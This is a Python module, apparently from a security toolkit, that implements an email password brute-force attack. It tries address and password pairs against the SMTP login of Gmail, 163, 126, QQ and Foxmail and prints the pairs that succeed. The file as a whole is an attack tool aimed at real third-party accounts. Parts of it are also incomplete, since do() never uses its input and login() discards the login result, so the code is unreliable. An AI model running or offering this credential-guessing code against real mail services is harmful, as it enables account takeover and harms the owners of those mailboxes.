#!/usr/bin/env python
# -*- coding: utf-8 -*-

import smtplib

from saker.brute.brute import Brute


class Email(Brute):

    """Email password brute
    """

    smtpServerConfigs = {
        'gmail': {
            'server': 'smtp.gmail.com',
            'port': 587,
            'tls': True
        },
        '163': {
            'server': 'smtp.163.com',
            'port': 25,
            'tls': False
        },
        '126': {
            'server': 'smtp.126.com',
            'port': 25,
            'tls': False
        },
        'qq': {
            'server': 'smtp.qq.com',
            'port': 25,
            'tls': False
        },
        'foxmail': {
            'server': 'smtp.foxmail.com',
            'port': 25,
            'tls': False
        }
    }

    def __init__(self):
        super(Email, self).__init__()
        self.smtpServers = {}

    def do(self, arg, res):
        if len(res) > 0:
            return
        mail = arg

    def login(self, mail, password):
        '''
        True: password correct
        False: password incorrect
        None: not support
        '''
        srv = mail.split('@')[-1].split('.')[0]
        if srv in self.smtpServerConfigs:
            self.smtpLogin(mail, password, srv)
        else:
            print(mail.split('@')[-1] + ' not support.')
            return None

    def smtpLogin(self, mail, password, srv):
        if srv not in self.smtpServers:
            self.smtpServers[srv] = self.srvInit(srv)
        try:
            self.smtpServers[srv].login(mail, password)
            print('%s %s' % (mail, password))
            return True
        except smtplib.SMTPAuthenticationError:
            return False

    def srvInit(self, srv):
        config = self.smtpServerConfigs[srv]
        smtpServer = smtplib.SMTP(config['server'], config['port'])
        if config['tls']:
            smtpServer.ehlo()
            smtpServer.starttls()
        return smtpServer
